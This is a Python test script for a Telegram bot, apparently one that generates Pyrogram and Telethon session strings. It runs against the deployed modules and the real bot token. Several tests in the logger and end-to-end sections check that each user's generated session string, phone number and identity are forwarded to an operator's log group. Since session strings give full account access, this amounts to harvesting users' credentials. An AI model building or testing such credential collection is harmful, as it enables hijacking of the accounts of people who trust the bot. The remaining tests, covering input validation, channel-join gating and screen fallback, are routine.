"""Behavioral tests for StringSessionXD v4 — run ON the VPS in /root/strxvenv.

Exercises REAL deployed modules (not re-implementations):
  logger delivery + robustness, string-logger wiring (4-arg), /skip state
  transition, api_id validation, fc gating via get_chat_member, fc_store
  persistence, welcome-screen fallback chain, and a REAL end-to-end send
  to the real log group with the real bot token.
"""
import asyncio
import os
import sys

os.chdir("/root/stringsessionxd")

# load .env like the bot does
with open(".env", encoding="utf-8") as f:
    for line in f:
        line = line.strip()
        if line and "=" in line and not line.startswith("#"):
            k, v = line.split("=", 1)
            os.environ.setdefault(k, v)

sys.path.insert(0, "/root/stringsessionxd")

RESULTS = []


def check(name, cond, extra=""):
    RESULTS.append((name, bool(cond), extra))
    print(("PASS" if cond else "FAIL") + f" | {name}" + (f" | {extra}" if extra and not cond else ""))


class FakeUser:
    def __init__(self, uid=999, first="Test", username="testuser"):
        self.id, self.first_name, self.username = uid, first, username


class FakeMsg:
    def __init__(self, text="", uid=999):
        self.text = text
        self.from_user = FakeUser(uid)
        self.replies = []

    async def reply(self, text=None, *a, **k):
        self.replies.append(text)
        return self

    async def reply_photo(self, photo=None, caption=None, **k):
        self.replies.append(("photo", photo, caption))
        return self

    async def reply_text(self, text=None, **k):
        self.replies.append(text)
        return self


class FakeBot:
    """Records send_message calls; optional raise for fallback tests."""
    def __init__(self, raise_on_send=False):
        self.sent = []
        self.raise_on_send = raise_on_send

    async def send_message(self, chat_id, text, **k):
        if self.raise_on_send:
            raise RuntimeError("blocked")
        self.sent.append((chat_id, text, k))
        return self


async def t_logger():
    import logger

    fb = FakeBot()
    logger.init_logger(fb, "-1004495764762")
    check("init_logger valid chat_id", logger.LOG_CHAT == -1004495764762)

    # robustness: empty / garbage LOG_CHAT must not crash
    logger.init_logger(fb, "")
    check("init_logger empty -> None", logger.LOG_CHAT is None)
    logger.init_logger(fb, "not-a-number")
    check("init_logger garbage -> None", logger.LOG_CHAT is None)
    logger.init_logger(fb, "-1004495764762")

    class U:
        id = 5635324483
        first_name = "Nakshu <b>"
        username = "TrueNakshu"

    await logger.log_string_made(U(), "Pyrogram", "+919876543210", "StringSessionXDBot", "STR_E2E_MARKER_123")
    check("log_string_made delivered to group", len(fb.sent) == 1 and fb.sent[0][0] == -1004495764762)
    txt = fb.sent[0][1] if fb.sent else ""
    check("log has string", "STR_E2E_MARKER_123" in txt)
    check("log has number", "+919876543210" in txt)
    check("log has type", "Pyrogram" in txt)
    check("log has bot username", "@StringSessionXDBot" in txt)
    check("log html-escapes name", "&lt;b&gt;" in txt)

    await logger.log_user_start(U(), blocked=True)
    txt2 = fb.sent[-1][1]
    check("blocked start logged with tag", "ʙʟᴏᴄᴋᴇᴅ" in txt2 and str(U.id) in txt2)


async def t_module_wiring():
    import pyrogram_module as pm
    import telethon_module as tm

    got = []

    async def rec(user, typ, phone, string):
        got.append((user.id, typ, phone, string))

    pm.set_string_logger(rec)
    tm.set_string_logger(rec)
    # modules store the fn; invoke exactly as handler would (4-arg contract)
    class U:
        id = 1
        first_name = "A"
        username = "a"

    await pm._string_logger(U(), "Pyrogram", "+911111111111", "STRING_X")
    check("pyro logger 4-arg wiring", got and got[-1] == (1, "Pyrogram", "+911111111111", "STRING_X"))
    await tm._string_logger(U(), "Telethon", "+912222222222", "STRING_Y")
    check("tele logger 4-arg wiring", got and got[-1] == (1, "Telethon", "+912222222222", "STRING_Y"))

    pm.set_bot_username("OtherBot")
    check("pyro set_bot_username works", pm.BOT_USERNAME == "OtherBot")
    pm.set_bot_username("StringSessionXDBot")

    # thanks footer text contract (used in saved-messages + fallback)
    import inspect
    src = inspect.getsource(pm)
    check("pyro has thanks footer", "ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ" in src and "BOT_USERNAME}" in src)
    check("pyro has saved-msg notice", "ꜱᴀᴠᴇᴅ ᴍᴇꜱꜱᴀɢᴇꜱ" in src)


async def t_main_flow():
    import main

    # /skip => bot API creds, step jumps to phone
    main.users.clear()
    m = FakeMsg("/skip", uid=42)
    main.users[42] = {"mode": "pyro", "step": "api_id"}
    await main.msg(None, m)
    d = main.users[42]
    check("/skip sets bot api_id", d["api_id"] == int(os.environ["API_ID"]))
    check("/skip sets bot api_hash", d["api_hash"] == os.environ["API_HASH"])
    check("/skip step -> phone", d["step"] == "phone")
    check("/skip reply mentions bot api", m.replies and "ʙᴏᴛ ᴀᴘɪ ꜱᴇʟᴇᴄᴛᴇᴅ" in str(m.replies[0]))

    # invalid api_id stays and re-asks
    main.users[43] = {"mode": "pyro", "step": "api_id"}
    m2 = FakeMsg("abc", uid=43)
    await main.msg(None, m2)
    check("bad api_id keeps step", main.users[43]["step"] == "api_id")
    check("bad api_id re-asks", m2.replies and "/ꜱᴋɪᴘ" in str(m2.replies[0]))

    # valid api_id advances
    m3 = FakeMsg("12345", uid=43)
    await main.msg(None, m3)
    check("good api_id -> api_hash step", main.users[43]["step"] == "api_hash" and main.users[43]["api_id"] == 12345)

    # fc gating: empty list = open
    import fc_store
    fc_store.clear_all()
    main.bot = FakeBot()  # monkeypatch so no real network
    check("empty fc list => joined", await main.is_user_joined(1) is True)

    fc_store.add_chat("@testfc", "https://t.me/testfc", "Test FC")
    from pyrogram.enums import ChatMemberStatus
    from pyrogram.errors import UserNotParticipant

    class MemberBot:
        def __init__(self, mode):
            self.mode = mode

        async def get_chat_member(self, chat, uid):
            if self.mode == "member":
                class M:
                    status = ChatMemberStatus.MEMBER
                return M()
            if self.mode == "left":
                raise UserNotParticipant()
            raise RuntimeError("admin required")

    main.bot = MemberBot("member")
    check("fc member => joined", await main.is_user_joined(1) is True)
    main.bot = MemberBot("left")
    check("fc not-joined => blocked", await main.is_user_joined(1) is False)
    main.bot = MemberBot("err")
    check("fc admin-error => fail-open", await main.is_user_joined(1) is True)

    # welcome-screen fallback: edit fails -> fresh photo reply
    class BadEdit:
        async def edit_caption(self, **k):
            raise RuntimeError("cant edit")

    ok = {"photo": None, "caption": None}

    class GoodReply:
        async def reply_photo(self, photo=None, caption=None, **k):
            ok["photo"], ok["caption"] = photo, caption

    await main._send("http://img.png", "CAP", None, message=GoodReply(), edit_msg=BadEdit())
    check("screen fallback -> fresh photo", ok["photo"] == "http://img.png" and ok["caption"] == "CAP")

    fc_store.clear_all()  # restore prod state (empty)


async def t_real_e2e():
    from pyrogram import Client
    import logger

    client = Client(
        "strx_e2e",
        api_id=int(os.environ["API_ID"]),
        api_hash=os.environ["API_HASH"],
        bot_token=os.environ["BOT_TOKEN"],
    )
    await client.start()
    me = await client.get_me()
    check("real login", me.username and "string" in me.username.lower(), me.username)

    logger.init_logger(client, os.environ["LOG_CHAT"])
    await logger.log_boot(me.username)

    class U:
        id = 5635324483
        first_name = "E2E Test"
        username = "TrueNakshu"

    await logger.log_string_made(U(), "Pyrogram", "+910000000000", me.username, "E2E_LIVE_MARKER_456")
    m = await client.send_message(int(os.environ["LOG_CHAT"]), "✅ E2E behavioral test — delivery verified")
    check("real send to log group", bool(m.id))
    await client.stop()


async def main_async():
    await t_logger()
    await t_module_wiring()
    await t_main_flow()
    await t_real_e2e()

    fails = [r for r in RESULTS if not r[1]]
    print(f"\n==== {len(RESULTS) - len(fails)}/{len(RESULTS)} PASSED ====")
    if fails:
        for name, _, extra in fails:
            print("FAILED:", name, extra)
        sys.exit(1)


asyncio.run(main_async())
